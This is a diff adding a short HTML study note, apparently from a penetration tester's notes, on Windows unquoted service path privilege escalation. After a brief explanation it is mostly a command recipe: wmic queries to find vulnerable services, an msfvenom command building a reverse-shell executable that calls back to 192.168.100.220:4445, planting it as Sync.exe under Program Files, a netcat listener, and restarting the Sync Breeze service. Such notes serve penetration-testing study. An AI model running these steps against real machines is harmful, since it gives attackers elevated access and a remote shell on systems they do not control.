@@ -1,0 +1,42 @@
+<hr />
+<p><a href="https://pentestlab.blog/2017/03/09/unquoted-service-path/">WPE-08 - Unquoted Service Path</a></p>
+
+<p>We can use this attack when we have write
+permissions to a service’s main directory and subdirectories but cannot replace files within them.</p>
+
+<p>if we have this path unquoted:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Program Files\My Program\My Service\service.exe
+</code></pre></div></div>
+<p>windows will try to run  in order:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Program.exe
+C:\Program Files\My.exe
+C:\Program Files\My Program\My.exe
+C:\Program Files\My Program\My service\service.exe
+</code></pre></div></div>
+<p> </p>
+<h2 id="-1-find-vulnerable-services">| 1 find vulnerable services</h2>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wmic service get name,displayname,pathname,startmode
+</code></pre></div></div>
+<p>or</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wmic service get name,displayname,pathname,startmode |findstr /i “auto” |findstr /i /v “c:\windows\\” |findstr /i /v “””
+</code></pre></div></div>
+<p>ex:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code> C:\Program Files (x86)\Sync Breeze Enterprise\bin\syncbrs.exe  
+</code></pre></div></div>
+<p> </p>
+<h2 id="-2-create-reverse-shell">| 2 create reverse shell</h2>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p windows/shell_reverse_tcp LHOST=192.168.100.220 LPORT=4445 -f exe -o shell2.exe
+</code></pre></div></div>
+<p> </p>
+<h2 id="-3-rename-and-move-binary">| 3 Rename and move binary</h2>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Program Files (x86)\Sync.exe
+</code></pre></div></div>
+<p> </p>
+<h2 id="-4-open-listener">| 4 open listener</h2>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc -nlvp 4445
+</code></pre></div></div>
+<p> </p>
+<h2 id="-5-restart-service">| 5 restart service</h2>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>net stop "Sync Breeze Enterprise"
+net start "Sync Breeze Enterprise"
+</code></pre></div></div>
